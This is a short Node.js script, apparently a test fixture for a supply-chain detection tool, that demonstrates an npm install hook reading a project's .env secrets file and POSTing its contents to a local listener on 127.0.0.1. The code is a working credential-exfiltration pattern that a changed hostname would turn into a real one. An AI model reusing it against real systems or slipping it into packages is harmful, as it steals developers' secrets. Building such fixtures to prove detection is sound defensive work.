#!/usr/bin/env node
'use strict';

// Synthetic demonstration of the read-then-egress pattern described in
// PRD.md 2.3 (Codecov, PyPI env-var beacons). This is a fixture for
// BuildLens's own Phase 0 detection-proof (ROADMAP.md M0.5) — never
// published, only reachable as a local file: dependency, and hard-coded
// to talk only to 127.0.0.1 inside the same CI job. It never contacts
// anything outside the runner.

const fs = require('fs');
const http = require('http');
const path = require('path');

// npm sets INIT_CWD to the directory `npm install` was actually invoked
// from — the postinstall script's own cwd is node_modules/<pkg>, not the
// project root, so this is the standard way to find the real project dir.
const projectRoot = process.env.INIT_CWD || process.cwd();
const envPath = path.join(projectRoot, '.env');

let payload;
try {
  payload = fs.readFileSync(envPath, 'utf8');
} catch (err) {
  console.error('demo: could not read .env:', err.message);
  process.exit(0);
}

const req = http.request(
  {
    hostname: '127.0.0.1',
    port: 9999,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'text/plain',
      'Content-Length': Buffer.byteLength(payload),
    },
  },
  (res) => res.resume()
);

req.on('error', (err) => {
  // Expected if this fixture is ever run outside the detection-proof
  // job, where nothing is listening on 127.0.0.1:9999.
  console.error('demo: local listener not reachable:', err.message);
});

req.write(payload);
req.end();
